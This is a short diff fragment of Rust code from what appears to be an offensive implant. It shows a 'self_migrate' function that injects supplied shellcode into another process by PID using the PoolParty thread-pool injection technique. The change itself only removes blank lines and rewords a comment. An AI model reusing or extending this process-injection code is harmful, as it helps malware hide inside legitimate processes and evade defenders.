@@ -165,8 +165,6 @@ unsafe fn open_process(pid: usize) -> Option<HANDLE> { unsafe {
     }
 }}
 
-
-
 pub unsafe fn self_migrate(shellcode: &[u8]) -> bool { unsafe {
     if shellcode.is_empty() {
         debug!("[MIGRATE] No Shellcode to inject");
@@ -194,7 +192,7 @@ pub unsafe fn self_migrate(shellcode: &[u8]) -> bool { unsafe {
                 }
             };
 
-            // TODO: PoolParty + MirrorGate
+            // Inject via PoolParty + MirrorGate
             debug!("[MIGRATE] Injecting via PoolParty into PID {}", pid);
             let success = poolparty::migrate(shellcode, handle, pid);
 
